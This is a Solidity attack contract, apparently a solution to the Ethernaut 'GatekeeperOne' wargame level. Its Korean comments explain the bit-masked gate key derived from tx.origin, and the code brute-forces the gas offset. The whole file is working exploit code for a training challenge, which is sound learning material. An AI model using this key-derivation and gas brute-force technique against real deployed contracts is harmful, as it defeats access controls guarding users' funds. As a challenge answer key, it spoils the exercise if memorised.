// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne target;
    
    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function attack() public {
        // gateKey 생성
        // 0xFFFFFFFF : 상위 32비트 유지 (조건 2 만족)
        // 0x0000 : 16-31비트를 0으로 (조건 1 만족)
        // 0xFFFF : 하위 16비트 유지 (조건 3 만족)
        // 0x FFFF FFFF 0000 FFFF
        bytes8 key = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        // gas brute force
        for (uint256 i = 0; i < 8191; i++) { // 3,000,000 - (add, jump, push 비트 수 + network 추가 가스비) => 남은걸 반환
            (bool ok, ) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSelector(
                    target.enter.selector,
                    key
                )
            );

            if (ok) {
                break;
            }
        }
    }
}
